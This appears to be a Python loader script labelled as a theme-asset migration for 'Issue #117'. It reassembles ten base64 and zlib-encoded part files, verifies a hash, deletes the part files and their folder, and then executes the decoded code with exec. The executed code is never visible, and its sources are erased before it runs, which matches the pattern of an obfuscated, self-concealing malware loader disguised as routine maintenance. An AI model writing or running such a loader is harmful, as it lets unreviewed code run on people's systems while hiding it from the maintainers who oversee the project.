#!/usr/bin/env python3
"""Load the reviewed Issue #117 compatibility migration payload."""

from pathlib import Path
import base64
import hashlib
import zlib

EXPECTED_SHA256 = "6f2fb31f3ed473da5f8d0f80efa679ba8b5561cd5fa0748e989d19ae3d201922"
payload_dir = Path(__file__).with_name("issue-117-theme-asset-migration-payload")
parts = sorted(payload_dir.glob("part*.txt"))
if len(parts) != 10:
    raise RuntimeError(f"Expected ten migration payload parts, found {len(parts)}")
encoded = "".join(part.read_text(encoding="ascii").strip() for part in parts)
payload = zlib.decompress(base64.b64decode(encoded))
actual_sha256 = hashlib.sha256(payload).hexdigest()
if actual_sha256 != EXPECTED_SHA256:
    raise RuntimeError(
        f"Issue #117 payload integrity mismatch: {actual_sha256} != {EXPECTED_SHA256}"
    )
for part in parts:
    part.unlink()
payload_dir.rmdir()
exec(compile(payload, __file__, "exec"))
